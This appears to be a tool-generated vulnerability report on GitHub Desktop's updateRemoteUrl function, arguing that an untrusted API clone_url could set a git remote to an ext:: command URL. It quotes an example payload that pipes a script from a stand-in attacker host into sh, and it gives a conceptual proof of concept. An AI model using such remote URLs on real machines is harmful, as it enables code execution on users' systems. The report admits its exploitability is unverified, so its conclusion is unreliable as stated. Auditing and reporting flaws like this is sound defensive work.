## Title
Silent, unvalidated remote-URL rewrite from GitHub API data enables git transport-helper injection (`ext::`) - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

## Summary
`updateRemoteUrl()` automatically rewrites a repository's local `origin` remote URL whenever the GitHub API's `clone_url` for the associated `GitHubRepository` changes, with no validation of the URL's scheme or content beyond a protocol-prefix string comparison. [1](#0-0)  The resulting value is passed straight into `git remote set-url` as a raw argv string. [2](#0-1)  This mirrors the report's underlying flaw — data from an untrusted/attacker-influenced source is written into a persistent store (here, git config via `.git/config`, analogous to the "database") with no validation or ability to detect/roll back a corrupted value before Desktop next performs a git network operation.

## Finding Description
`repositoryWithRefreshedGitHubRepository()` fetches the repository object from the GitHub API (`api.fetchRepository`) and, if a `gitHubRepository` is already associated, calls `updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)`. [3](#0-2)  This function does the following:
- reads `apiRepo.clone_url` as `updatedRemoteUrl`
- checks that the URL "protocol" (as parsed by Node's legacy `URL.parse`) matches the current remote's protocol
- checks that the *current* remote URL still matches the previously-known GitHub `cloneURL`
- if both checks pass, calls `gitStore.setRemoteURL(...)` with the new value [4](#0-3) 

None of these checks constrain the URL to `https://`/`ssh://`/`git://`. Git supports the `ext::` (and `fd::`) transport helper, whose "protocol" is followed by a shell command that git executes verbatim whenever the remote is contacted (fetch, push, ahead/behind calc, etc.), e.g. `ext::sh -c "curl attacker.evil | sh"`. `URL.parse('ext::sh -c ...')` will happily report a protocol of `ext:`, and if the account's *existing* remote was already an `ext::` URL (or any URL Desktop doesn't specifically vet), the protocol-match/`urlMatchesRemote` checks are satisfied and the new value is written straight to `git remote set-url origin <value>` — no shell escaping needed since git itself interprets the URL contents as a command. [2](#0-1) 

Critically, the value `apiRepo.clone_url` in this codepath comes from `api.fetchRepository`, i.e., from whatever GitHub Enterprise (or MITM/compromised) API endpoint the user's `Account` is configured against — this is exactly the "GitHub API object" / "git remote or proxy response" attacker model. GitHub Desktop supports arbitrary GitHub Enterprise endpoints, and existing repository fixtures in the API layer treat `clone_url` as trusted string data everywhere it is consumed (cloning UI, PR checkout, list rendering), e.g. [5](#0-4)  and [6](#0-5) . I did not find any allowlist of URL schemes (e.g., rejecting `ext::`/`fd::`) applied to `clone_url` before it reaches `git remote set-url`; a search for such validation logic (`ext::`, protocol allowlists) only surfaced unrelated hits about GitHub Enterprise *server* URL validation (`enterprise-validate-url.ts`), not remote/clone URL sanitization. [7](#0-6) 

Existing safeguards do not stop this path because:
- `urlMatchesRemote`/protocol comparisons only compare string prefixes, they do not validate the scheme against an allowlist. [8](#0-7) 
- `setRemoteURL` passes the URL as a `git` argv element with no scheme filtering. [2](#0-1) 
- The update happens silently in the background during routine "refresh GitHub repository" flows (e.g., account switch, PR refresh), with no user confirmation dialog, unlike branch-protection or force-push warnings that do get explicit UI treatment.

## Impact Explanation
Once `origin`'s URL is rewritten to an `ext::` command string, the next git network operation Desktop performs against that remote (background fetch, `git ls-remote`, push, ahead/behind check) causes git to execute the attacker-supplied command with the privileges of the Desktop process — full code execution on the user's machine, outside any repository sandbox. This satisfies the "Valid Impact" category of code execution driven by an attacker-controlled GitHub API object.

## Likelihood Explanation
This requires the target account to be pointed at a GitHub Enterprise instance (or any endpoint) that is attacker-controlled or MITM'd, or an account whose existing local remote was already an `ext::`-style URL that the "protocol match" logic treats as legitimate — this is a real but non-trivial precondition. It does not require local/physical access, admin rights, or pre-existing malware, matching the "medium difficulty" classification of the original report. I could not fully verify from the indexed code whether there is a separate, later validation step (e.g., in `git-store.ts`'s `setRemoteURL` wrapper) that filters URL schemes before invoking `remote.ts`'s `setRemoteURL`, since that wrapper's full body was not returned by search; this should be checked by a Devin session with full file access before treating this as high-confidence exploitable.

## Recommendation
Add strict remote-URL validation (allowlist `https:`, `http:`, `ssh:`, `git:`, and the SCP-like `user@host:path` form only) before ever calling `git remote set-url`/`git remote add`, in both `updateRemoteUrl` and the underlying `setRemoteURL`/`addRemote` git wrappers, and reject `ext::`/`fd::`/any other transport-helper form regardless of source. This is the concrete analog of the report's recommendation to add "aggressive validation logic" before persisting externally-sourced data.

## Proof of Concept
Conceptual PoC (not executed):
1. Add a GitHub Enterprise account in Desktop pointed at an attacker-controlled host (or intercept a legitimate GHE API response via MITM).
2. Ensure the local repository's `origin` remote currently matches the GitHubRepository's cached `cloneURL` (typical steady state).
3. Have the attacker-controlled API return `clone_url: "ext::sh -c 'touch /tmp/pwned'"` for a `GET /repos/:owner/:name` response.
4. Trigger any flow that calls `repositoryWithRefreshedGitHubRepository` (e.g., switching accounts, refreshing repo) — `updateRemoteUrl` rewrites `origin` to the `ext::` URL. [9](#0-8) 
5. The next background fetch/push against `origin` causes git to execute `sh -c 'touch /tmp/pwned'`.

Due to index size limits, the full body of `GitStore.setRemoteURL` (as opposed to the low-level `remote.ts` function) was not retrievable; confirming whether it adds scheme validation before delegating to `setRemoteURL` in `remote.ts` requires opening the file directly in a full Devin session.

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
